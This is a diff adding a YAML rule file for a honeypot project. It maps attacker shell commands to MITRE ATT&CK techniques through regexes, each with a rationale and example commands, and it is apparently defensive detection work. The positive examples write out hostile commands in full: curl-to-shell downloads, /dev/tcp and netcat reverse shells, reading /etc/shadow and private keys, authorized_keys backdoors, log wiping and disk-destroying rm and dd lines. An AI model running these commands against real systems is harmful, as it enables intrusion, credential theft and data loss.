@@ -1,0 +1,529 @@
+# HoneyLens ATT&CK detection rules
+# ---------------------------------
+# What: each rule says "if an attacker command matches this regular expression,
+# it is evidence of this MITRE ATT&CK technique".
+#
+# Why YAML: rules are data, not code. A beginner (or reviewer) can read and
+# add a rule without touching Python, and tests check every rule automatically.
+#
+# Field guide:
+#   id          unique rule ID (HL-<TACTIC>-<NUMBER>)
+#   regex       Python regular expression, matched case-insensitively with
+#               re.search() against ONE sanitized command (max 4096 chars).
+#               Keep patterns simple: no nested quantifiers like (a+)+ so a
+#               hostile command cannot cause catastrophic backtracking (ReDoS).
+#   technique   ATT&CK technique ID. Must exist in the bundled snapshot and must
+#               NOT be revoked or deprecated (tests enforce this).
+#   tactic      ATT&CK tactic short name the rule is counted under.
+#   confidence  high | medium | low  (how sure we are the match really means the
+#               technique, not how dangerous it is)
+#   rationale   why this pattern means this technique, in plain English
+#   positive    example commands that MUST match (tested)
+#   negative    example commands that must NOT match (tested)
+#
+# ATT&CK version note: this file targets Enterprise ATT&CK v19.2. In v19 MITRE
+# split the old "Defense Evasion" tactic (TA0005) into "Stealth" (TA0005) and
+# "Defense Impairment" (TA0112). Our "defense evasion" coverage therefore uses
+# those two tactic names.
+
+attack_version: "19.2"
+rules:
+  # ---------------------------------------------------------------- Discovery
+  - id: HL-DISC-001
+    regex: '(^|[;&|\s(])uname(\s|;|$)'
+    technique: T1082
+    tactic: discovery
+    confidence: high
+    rationale: uname prints kernel and CPU details. Bots run it first to pick the right payload for the CPU architecture.
+    positive: ["uname -a", "uname -m; uname -r"]
+    negative: ["unamed_file", "cat uname.txt.bak_old" ]
+  - id: HL-DISC-002
+    regex: '/proc/cpuinfo|\blscpu\b|\bnproc\b'
+    technique: T1082
+    tactic: discovery
+    confidence: high
+    rationale: Reading CPU core count and model is how cryptominers decide how many mining threads to start.
+    positive: ["cat /proc/cpuinfo | grep name | wc -l", "lscpu", "nproc"]
+    negative: ["cat /proc/version_x_cpu"]
+  - id: HL-DISC-003
+    regex: '\b(whoami|id)\b(\s|;|$)|\bw\s*$|\blast\s*$'
+    technique: T1033
+    tactic: discovery
+    confidence: medium
+    rationale: whoami/id/w show which user the attacker is logged in as and who else is on the box.
+    positive: ["whoami", "id", "w"]
+    negative: ["identify", "widget"]
+  - id: HL-DISC-004
+    regex: '\b(ifconfig|ip\s+(a|addr|route|r|link)|route\s+-n|hostname\s+-I)\b|/etc/resolv\.conf'
+    technique: T1016
+    tactic: discovery
+    confidence: high
+    rationale: Network interface and routing commands map the victim's network configuration.
+    positive: ["ifconfig", "ip addr show", "cat /etc/resolv.conf"]
+    negative: ["zip archive", "skip addresses"]
+  - id: HL-DISC-005
+    regex: '\bps\s+(-?aux|-ef|aux)\b|\btop\s+-b|\bpgrep\b'
+    technique: T1057
+    tactic: discovery
+    confidence: high
+    rationale: Listing processes shows competing malware or monitoring tools the attacker may want to kill.
+    positive: ["ps aux", "ps -ef | grep miner", "top -b -n1"]
+    negative: ["cat ps", "maps -ef"]
+  - id: HL-DISC-006
+    regex: '\b(netstat|ss)\s+-[a-z]*[tuln]'
+    technique: T1049
+    tactic: discovery
+    confidence: high
+    rationale: netstat/ss show open ports and live connections on the machine.
+    positive: ["netstat -tulpn", "ss -tan"]
+    negative: ["class -t"]
+  - id: HL-DISC-007
+    regex: '/etc/passwd\b(?!-)'
+    technique: T1087.001
+    tactic: discovery
+    confidence: medium
+    rationale: /etc/passwd lists local user accounts. Reading it is account discovery (it holds no hashes on modern systems).
+    positive: ["cat /etc/passwd", "grep bash /etc/passwd"]
+    negative: ["cat /etc/passwd-", "passwd"]
+  - id: HL-DISC-008
+    regex: '/etc/group\b|\bgroups\b(\s|$)|\bgetent\s+group'
+    technique: T1069.001
+    tactic: discovery
+    confidence: medium
+    rationale: Group listings reveal which users have admin (sudo/wheel) rights.
+    positive: ["cat /etc/group", "groups", "getent group sudo"]
+    negative: ["groupsies"]
+  - id: HL-DISC-009
+    regex: '\b(free\s+-[mhg]|df\s+-h|lsblk|du\s+-sh)\b'
+    technique: T1082
+    tactic: discovery
+    confidence: medium
+    rationale: Memory and disk size checks help a miner or loader decide if the host is worth using.
+    positive: ["free -m", "df -h", "lsblk"]
+    negative: ["freedom -m"]
+  - id: HL-DISC-010
+    regex: '/etc/(os-release|issue|lsb-release|redhat-release|debian_version)\b(?![._])|\blsb_release\b|/proc/version'
+    technique: T1082
+    tactic: discovery
+    confidence: high
+    rationale: OS release files tell the attacker which Linux distribution and version is running.
+    positive: ["cat /etc/os-release", "lsb_release -a", "cat /proc/version"]
+    negative: ["cat /etc/issues_old_backup_xx.txt_"]
+  - id: HL-DISC-011
+    regex: '\bcrontab\s+-l\b'
+    technique: T1007
+    tactic: discovery
+    confidence: low
+    rationale: Listing cron jobs enumerates scheduled background jobs, often to find a rival miner's persistence. Closest fit is System Service Discovery.
+    positive: ["crontab -l"]
+    negative: ["crontab -r"]
+  - id: HL-DISC-012
+    regex: '\b(ls|find)\s+[^;|]{0,80}(/tmp|/var/tmp|/dev/shm|~/\.ssh|/root)\b'
+    technique: T1083
+    tactic: discovery
+    confidence: medium
+    rationale: Listing writable or sensitive folders shows where to drop tools or what credentials exist.
+    positive: ["ls -la /tmp", "find / -name id_rsa -path /root"]
+    negative: ["ls -la /home/user/docs"]
+  - id: HL-DISC-013
+    regex: '\b(which|command\s+-v)\s+(wget|curl|tftp|ftpget|python3?|perl|gcc|busybox)\b'
+    technique: T1518
+    tactic: discovery
+    confidence: high
+    rationale: Checking which download tools or compilers exist decides how the next payload will be fetched.
+    positive: ["which wget curl", "command -v python3"]
+    negative: ["which ls"]
+  - id: HL-DISC-014
+    regex: '\b(nvidia-smi|lspci\s*\|\s*grep\s+-i\s+(vga|nvidia))\b'
+    technique: T1082
+    tactic: discovery
+    confidence: medium
+    rationale: GPU checks are typical of miners deciding whether GPU mining is possible.
+    positive: ["nvidia-smi", "lspci | grep -i vga"]
+    negative: ["lspci -v"]
+
+  # ---------------------------------------------------------------- Execution
+  - id: HL-EXEC-001
+    regex: '\b(sh|bash|ash|dash)\s+(-c\s+|[^;|\s]{1,120}\.sh\b)'
+    technique: T1059.004
+    tactic: execution
+    confidence: high
+    rationale: Running a script or a -c string through a Unix shell is the core Unix Shell execution technique.
+    positive: ["sh -c 'echo hi'", "bash install.sh"]
+    negative: ["bashful", "ssh -c aes"]
+  - id: HL-EXEC-002
+    regex: '\|\s*(ba)?sh\b'
+    technique: T1059.004
+    tactic: execution
+    confidence: high
+    rationale: Piping downloaded text straight into a shell ("curl ... | sh") executes code without saving it first.
+    positive: ["curl -s http://198.51.100.7/x | sh", "wget -qO- example.test/i | bash"]
+    negative: ["cat file | shuf"]
+  - id: HL-EXEC-003
+    regex: '\bchmod\s+(\+x|[0-7]?7[0-7]{2})\s+[^;|]{1,120}(;|&&)\s*\./'
+    technique: T1059.004
+    tactic: execution
+    confidence: high
+    rationale: Making a file executable and running it immediately is the classic loader pattern.
+    positive: ["chmod +x bot; ./bot", "chmod 777 x86 && ./x86 ssh"]
+    negative: ["chmod 644 notes.txt"]
+  - id: HL-EXEC-004
+    regex: '\bpython[23]?\s+-c\b|\bperl\s+-e\b'
+    technique: T1059.006
+    tactic: execution
+    confidence: medium
+    rationale: Inline Python (or Perl) one-liners run code without dropping a script file.
+    positive: ["python3 -c 'import os'", "perl -e 'print 1'"]
+    negative: ["python3 --version"]
+  - id: HL-EXEC-005
+    regex: '^\s*\./[A-Za-z0-9._-]{1,64}'
+    technique: T1059.004
+    tactic: execution
+    confidence: medium
+    rationale: Running a binary from the current folder usually means running a freshly dropped payload.
+    positive: ["./x86_64 ssh.loader", "./kswapd0"]
+    negative: ["cd ./folder"]
+  - id: HL-EXEC-006
+    regex: '\bnohup\b|\bsetsid\b|\bdisown\b'
+    technique: T1059.004
+    tactic: execution
+    confidence: low
+    rationale: nohup/setsid keep a payload running after the attacker disconnects.
+    positive: ["nohup ./miner &", "setsid ./bot"]
+    negative: ["no hup here"]
+  - id: HL-EXEC-007
+    regex: '\b(busybox)\s+[A-Za-z]'
+    technique: T1059.004
+    tactic: execution
+    confidence: medium
+    rationale: IoT (Internet of Things) bots like Mirai call commands through busybox because cheap devices have nothing else.
+    positive: ["busybox wget", "/bin/busybox ECCHI"]
+    negative: ["busy box"]
+
+  # -------------------------------------------------------------- Persistence
+  - id: HL-PERS-001
+    regex: '\.ssh/authorized_keys'
+    technique: T1098.004
+    tactic: persistence
+    confidence: high
+    rationale: Writing an attacker key into authorized_keys gives password-less access forever, even after a password change.
+    positive: ["echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", "cat .ssh/authorized_keys"]
+    negative: ["cat ~/.ssh/known_hosts"]
+  - id: HL-PERS-002
+    regex: '\bchattr\s+[+-]i[a]?\s+[^;|]{0,80}\.ssh'
+    technique: T1098.004
+    tactic: persistence
+    confidence: high
+    rationale: Making .ssh immutable stops the owner (or other malware) from removing the attacker's key.
+    positive: ["chattr +i ~/.ssh/authorized_keys", "chattr -ia .ssh"]
+    negative: ["chattr +i /etc/hosts"]
+  - id: HL-PERS-003
+    regex: 'crontab\s+(-\s*$|[^-\s;|][^;|]{0,80}$)|/etc/cron\.|/var/spool/cron|\(crontab\s+-l'
+    technique: T1053.003
+    tactic: persistence
+    confidence: high
+    rationale: Writing a cron job re-launches the payload every few minutes or at reboot.
+    positive: ["(crontab -l; echo '* * * * * /tmp/x') | crontab -", "echo x > /etc/cron.d/sys"]
+    negative: ["cronjob docs"]
+  - id: HL-PERS-004
+    regex: '\b(useradd|adduser)\b|\busermod\s+-[a-zA-Z]*G\b'
+    technique: T1136.001
+    tactic: persistence
+    confidence: high
+    rationale: Creating a new local account is a backdoor that survives removal of the original payload.
+    positive: ["useradd -m -s /bin/bash sysadm", "usermod -aG sudo bob"]
+    negative: ["user add later"]
+  - id: HL-PERS-005
+    regex: '\bchpasswd\b|echo\s+[^;|]{1,80}\|\s*passwd'
+    technique: T1098
+    tactic: persistence
+    confidence: high
+    rationale: Changing an account password locks out the owner and keeps the attacker's access (Account Manipulation).
+    positive: ["echo 'root:Xy12' | chpasswd", "echo -e 'a\\na' | passwd"]
+    negative: ["passwd --help"]
+  - id: HL-PERS-006
+    regex: '/etc/systemd/system/|\bsystemctl\s+(enable|daemon-reload)\b'
+    technique: T1543.002
+    tactic: persistence
+    confidence: high
+    rationale: Installing or enabling a systemd service starts the payload automatically at boot.
+    positive: ["systemctl enable sysupdate", "cp x.service /etc/systemd/system/"]
+    negative: ["systemctl status ssh"]
+  - id: HL-PERS-007
+    regex: '/etc/rc\.local|/etc/init\.d/'
+    technique: T1037.004
+    tactic: persistence
+    confidence: medium
+    rationale: rc.local and init.d scripts run at boot on older Linux systems.
+    positive: ["echo /tmp/x >> /etc/rc.local", "cp x /etc/init.d/"]
+    negative: ["cat rc.locale"]
+  - id: HL-PERS-008
+    regex: '>>?\s*~?/?[^;|\s]{0,40}\.(bashrc|bash_profile|profile)\b'
+    technique: T1546.004
+    tactic: persistence
+    confidence: high
+    rationale: Appending to .bashrc/.profile runs the attacker's command every time someone logs in.
+    positive: ["echo '/tmp/.x &' >> ~/.bashrc", "echo x >> /root/.profile"]
+    negative: ["cat ~/.bashrc"]
+
+  # ---------------------------------- Defense evasion (Stealth, TA0005 in v19)
+  - id: HL-STEALTH-001
+    regex: '\bhistory\s+-c\b|>\s*~?/?[^;|\s]{0,30}\.bash_history|rm\s+[^;|]{0,40}\.bash_history|ln\s+-sf?\s+/dev/null\s+[^;|]{0,40}history'
+    technique: T1070.003
+    tactic: stealth
+    confidence: high
+    rationale: Clearing shell history removes the record of what the attacker typed.
+    positive: ["history -c", "cat /dev/null > ~/.bash_history", "rm -f .bash_history"]
+    negative: ["history | tail"]
+  - id: HL-STEALTH-002
+    regex: '\brm\s+-[a-z]*f[a-z]*\s+[^;|]{0,80}(/tmp/|/var/tmp/|/dev/shm/|\$0|\./)'
+    technique: T1070.004
+    tactic: stealth
+    confidence: medium
+    rationale: Force-deleting dropped files right after running them removes evidence (File Deletion).
+    positive: ["rm -rf /tmp/x86", "rm -f ./bins.sh"]
+    negative: ["rm notes.txt"]
+  - id: HL-STEALTH-003
+    regex: '\bbase64\s+(-d|--decode)\b'
+    technique: T1140
+    tactic: stealth
+    confidence: high
+    rationale: Decoding base64 at run time hides the real command from simple text filters.
+    positive: ["echo aGVsbG8= | base64 -d | sh", "base64 --decode p.txt"]
+    negative: ["base64 file.txt"]
+  - id: HL-STEALTH-004
+    regex: '\b(mkdir|cd|mv|cp)\s+[^;|]{0,60}/\.[A-Za-z0-9._-]{1,32}'
+    technique: T1564.001
+    tactic: stealth
+    confidence: medium
+    rationale: Dot-folders (like /tmp/.x) are hidden from a plain ls, a cheap way to hide tools.
+    positive: ["mkdir /tmp/.ice-unix2", "cd /dev/shm/.x"]
+    negative: ["mkdir /tmp/build"]
+  - id: HL-STEALTH-005
+    regex: '\b(kswapd0|kworker|systemd-update|\[kthreadd\]|dbused|sshd2)\b'
+    technique: T1036
+    tactic: stealth
+    confidence: medium
+    rationale: Miners often name themselves after real kernel or system processes so admins ignore them (Masquerading).
+    positive: ["./kswapd0 -c cfg", "mv x dbused"]
+    negative: ["cat swap.txt"]
+  - id: HL-STEALTH-006
+    regex: '\btouch\s+-[a-z]*r\b|\btouch\s+-t\s+\d'
+    technique: T1070.006
+    tactic: stealth
+    confidence: medium
+    rationale: Copying an old timestamp onto a new file (timestomping) hides when it was dropped.
+    positive: ["touch -r /bin/ls /tmp/x", "touch -t 202001010000 x"]
+    negative: ["touch newfile"]
+
+  # --------------------- Defense evasion (Defense Impairment, TA0112 in v19)
+  - id: HL-IMPAIR-001
+    regex: '/var/log/(wtmp|btmp|lastlog|auth\.log|secure|messages|syslog)|\bjournalctl\s+--(vacuum|rotate)'
+    technique: T1685.006
+    tactic: defense-impairment
+    confidence: high
+    rationale: Emptying login logs (wtmp/btmp/auth.log) or the journal hides the intrusion from defenders.
+    positive: ["echo > /var/log/wtmp", "journalctl --vacuum-time=1s"]
+    negative: ["cat /var/log/nginx/access.log"]
+  - id: HL-IMPAIR-002
+    regex: '\b(ufw\s+disable|iptables\s+-F|systemctl\s+(stop|disable)\s+(firewalld|ufw)|setenforce\s+0)\b'
+    technique: T1686
+    tactic: defense-impairment
+    confidence: high
+    rationale: Turning off the host firewall or SELinux opens the machine for more connections.
+    positive: ["iptables -F", "ufw disable", "setenforce 0"]
+    negative: ["iptables -L"]
+  - id: HL-IMPAIR-003
+    regex: '\b(pkill|killall|kill\s+-9)\b[^;|]{0,60}(aliyun|aegis|qcloud|bcm-agent|auditd|falcon|osquery|xmrig|kinsing|kdevtmpfsi)'
+    technique: T1685
+    tactic: defense-impairment
+    confidence: high
+    rationale: Killing cloud monitoring agents (and rival miners) stops security tools from reporting.
+    positive: ["pkill -9 aliyun-service", "killall xmrig"]
+    negative: ["killall firefox"]
+  - id: HL-IMPAIR-004
+    regex: '\bunset\s+HISTFILE\b|HISTSIZE=0|HISTFILESIZE=0|export\s+HISTFILE=/dev/null'
+    technique: T1690
+    tactic: defense-impairment
+    confidence: high
+    rationale: Turning off history logging before typing means nothing is recorded at all.
+    positive: ["unset HISTFILE", "export HISTFILE=/dev/null"]
+    negative: ["echo $HISTFILE"]
+  - id: HL-IMPAIR-005
+    regex: '\bchattr\s+-[ia]+\s+(?![^;|]{0,80}\.ssh)'
+    technique: T1222.002
+    tactic: defense-impairment
+    confidence: medium
+    rationale: Removing the immutable flag from system files lets malware overwrite protected files.
+    positive: ["chattr -i /etc/ld.so.preload", "chattr -ia /usr/bin/wget"]
+    negative: ["chattr -i ~/.ssh/authorized_keys"]
+
+  # -------------------------------------------------------- Credential Access
+  - id: HL-CRED-001
+    regex: '/etc/shadow\b|/etc/passwd-|/etc/gshadow\b|\bunshadow\b'
+    technique: T1003.008
+    tactic: credential-access
+    confidence: high
+    rationale: /etc/shadow holds password hashes that can be cracked offline.
+    positive: ["cat /etc/shadow", "unshadow passwd shadow"]
+    negative: ["cat /etc/hosts"]
+  - id: HL-CRED-002
+    regex: '\bid_(rsa|ed25519|ecdsa|dsa)\b|\.aws/credentials|\.docker/config\.json|\.git-credentials|\.pgpass\b'
+    technique: T1552.001
+    tactic: credential-access
+    confidence: high
+    rationale: Private keys and cloud or app credential files let the attacker move to other systems.
+    positive: ["cat ~/.ssh/id_rsa", "cat ~/.aws/credentials"]
+    negative: ["cat id_card.txt"]
+  - id: HL-CRED-003
+    regex: '\bgrep\s+[^;|]{0,40}-[a-z]*r[a-z]*\s+[^;|]{0,40}(password|passwd|secret|api_key|token)\b'
+    technique: T1552.001
+    tactic: credential-access
+    confidence: medium
+    rationale: Recursively grepping for the word password hunts for credentials saved in files.
+    positive: ["grep -ri password /var/www", "grep -rn api_key /home"]
+    negative: ["grep error log.txt"]
+  - id: HL-CRED-004
+    regex: '\bhistory\s*(\|\s*grep|$)|cat\s+[^;|]{0,30}\.bash_history'
+    technique: T1552.003
+    tactic: credential-access
+    confidence: low
+    rationale: Old shell history often contains passwords typed on the command line.
+    positive: ["history", "cat ~/.bash_history"]
+    negative: ["history -c"]
+
+  # ------------------------------------------------------ Command and Control
+  - id: HL-C2-001
+    regex: '\b(wget|curl|tftp|ftpget|fetch)\b[^;|]{0,200}(https?|ftp|tftp)://'
+    technique: T1105
+    tactic: command-and-control
+    confidence: high
+    rationale: Downloading a file from a remote URL brings attacker tools onto the host (Ingress Tool Transfer).
+    positive: ["wget http://198.51.100.20/bins.sh", "curl -O https://payload.invalid/x"]
+    negative: ["curl --version"]
+  - id: HL-C2-002
+    regex: '\btftp\s+(-g|-r)\b|\bftpget\b'
+    technique: T1105
+    tactic: command-and-control
+    confidence: high
+    rationale: TFTP (Trivial File Transfer Protocol) downloads are a Mirai-family favourite on IoT devices.
+    positive: ["tftp -g -r mips 198.51.100.3", "ftpget -v 203.0.113.9 x x"]
+    negative: ["tftpd docs"]
+  - id: HL-C2-003
+    regex: '/dev/(tcp|udp)/[0-9a-zA-Z.\-]{1,64}/[0-9]{1,5}'
+    technique: T1095
+    tactic: command-and-control
+    confidence: high
+    rationale: Bash /dev/tcp redirection opens a raw socket, often a reverse shell to the attacker.
+    positive: ["bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"]
+    negative: ["ls /dev/tty"]
+  - id: HL-C2-004
+    regex: '\b(nc|ncat|netcat)\b[^;|]{0,60}\s-[a-z]*e\b|\bsocat\b[^;|]{0,80}exec:'
+    technique: T1095
+    tactic: command-and-control
+    confidence: high
+    rationale: netcat or socat with -e/exec wires a shell to a network socket.
+    positive: ["nc 203.0.113.5 4444 -e /bin/sh", "socat tcp:x:1 exec:sh"]
+    negative: ["nc -zv 127.0.0.1 22"]
+  - id: HL-C2-005
+    regex: '\bssh\s+[^;|]{0,80}-[a-zA-Z]*[DRL]\s*[0-9]'
+    technique: T1572
+    tactic: command-and-control
+    confidence: medium
+    rationale: SSH -D/-R/-L flags build tunnels or SOCKS proxies through the victim.
+    positive: ["ssh -D 1080 user@198.51.100.4", "ssh -N -R 9000:localhost:22 x"]
+    negative: ["ssh user@host"]
+  - id: HL-C2-006
+    regex: '\b(curl|wget)\b[^;|]{0,120}(-X\s+POST|--post-data|--data|-d\s)'
+    technique: T1071.001
+    tactic: command-and-control
+    confidence: low
+    rationale: HTTP POST from a shell is often a bot checking in with its controller over web protocols.
+    positive: ["curl -X POST http://c2.invalid/reg -d id=1", "wget --post-data=a=1 http://x.test"]
+    negative: ["curl http://x.test"]
+
+  # ----------------------------------------- Impact (Resource Hijacking)
+  - id: HL-IMPACT-001
+    regex: '\b(xmrig|xmr-stak|cpuminer|minerd|nbminer|t-rex|phoenixminer|lolminer)\b'
+    technique: T1496.001
+    tactic: impact
+    confidence: high
+    rationale: These are well-known cryptocurrency miner programs; running them steals CPU (Compute Hijacking).
+    positive: ["./xmrig -o pool.invalid:3333", "nohup minerd &"]
+    negative: ["xml rig docs"]
+  - id: HL-IMPACT-002
+    regex: 'stratum\+(tcp|ssl)://|--donate-level|(^|\s)-o\s+[^\s;|]{1,80}:(3333|4444|5555|7777|14444)\b'
+    technique: T1496.001
+    tactic: impact
+    confidence: high
+    rationale: stratum:// URLs and typical pool ports are the mining protocol, even when the miner binary is renamed.
+    positive: ["./x -o stratum+tcp://pool.invalid:3333", "./sys -o mine.test:4444 -u wallet"]
+    negative: ["ls -o file"]
+  - id: HL-IMPACT-003
+    regex: '/proc/sys/vm/nr_hugepages|vm\.nr_hugepages|\bmsr\b.*modprobe|modprobe\s+msr'
+    technique: T1496.001
+    tactic: impact
+    confidence: medium
+    rationale: Enabling huge pages and the msr module are XMRig tuning steps that boost mining speed.
+    positive: ["echo 1280 > /proc/sys/vm/nr_hugepages", "modprobe msr"]
+    negative: ["cat /proc/meminfo"]
+  - id: HL-IMPACT-004
+    regex: '\b(shutdown|reboot|poweroff|halt)\b(\s|$)|\binit\s+[06]\b'
+    technique: T1529
+    tactic: impact
+    confidence: low
+    rationale: Rebooting or halting the host disrupts the service (also used to apply persistence).
+    positive: ["reboot", "shutdown -h now"]
+    negative: ["rebooted yesterday"]
+  - id: HL-IMPACT-005
+    regex: '\brm\s+-rf\s+/(\s|\*|$)|\bdd\s+if=/dev/(zero|urandom)\s+of=/dev/[sh]d'
+    technique: T1485
+    tactic: impact
+    confidence: high
+    rationale: Wiping the root filesystem or overwriting a disk destroys data.
+    positive: ["rm -rf / --no-preserve-root", "dd if=/dev/zero of=/dev/sda"]
+    negative: ["rm -rf ./build"]
+
+  # ----------------------------------------------------------- Reconnaissance
+  - id: HL-RECON-001
+    regex: '\b(masscan|zmap|nmap|zgrab2?)\b'
+    technique: T1595.001
+    tactic: reconnaissance
+    confidence: high
+    rationale: Mass scanners on a compromised host are used to scan IP blocks for the next victims.
+    positive: ["masscan 198.51.100.0/24 -p22", "nmap -sS 203.0.113.0/24"]
+    negative: ["map file"]
+  - id: HL-RECON-002
+    regex: '\b(curl|wget)\s+[^;|]{0,60}(ipinfo\.io|ifconfig\.me|icanhazip|api\.ipify|checkip|myip)'
+    technique: T1590
+    tactic: reconnaissance
+    confidence: medium
+    rationale: Asking a "what is my IP" service tells the attacker the victim's public address and network.
+    positive: ["curl -s ipinfo.io", "wget -qO- ifconfig.me"]
+    negative: ["curl http://example.test"]
+  - id: HL-RECON-003
+    regex: '\bhydra\b|\bmedusa\b|\bpnscan\b|\bsshpass\b'
+    technique: T1595.002
+    tactic: reconnaissance
+    confidence: medium
+    rationale: Brute-force and service-scanning tools installed on the honeypot mean it is being turned into a scanner.
+    positive: ["./hydra -l root -P p.txt ssh://x", "pnscan 198.51.100.0/24 22"]
+    negative: ["hydrangea"]
+
+  # ------------------------------------- Honeypot probing (Stealth: System Checks)
+  - id: HL-STEALTH-007
+    regex: '\b(cowrie|kippo|honeypot|honeyd)\b|/proc/1/cgroup|\bsystemd-detect-virt\b|\bdmidecode\b|\bvirt-what\b'
+    technique: T1497.001
+    tactic: stealth
+    confidence: medium
+    rationale: Checking for virtual machines, containers or honeypot names is sandbox evasion (System Checks).
+    positive: ["cat /proc/1/cgroup", "ls /home/cowrie", "systemd-detect-virt"]
+    negative: ["cat /proc/1/status"]
+  - id: HL-STEALTH-008
+    regex: '\becho\s+-e\s+["'']?\\x[0-9a-f]{2}|\bprintf\s+["'']\\x[0-9a-f]{2}'
+    technique: T1027
+    tactic: stealth
+    confidence: medium
+    rationale: Hex-escaped echo/printf strings hide binary payloads or signatures inside text (Obfuscation). Mirai variants also use it as a liveness probe.
+    positive: ["echo -e '\\x67\\x61\\x79'", "printf '\\x41'"]
+    negative: ["echo hello"]
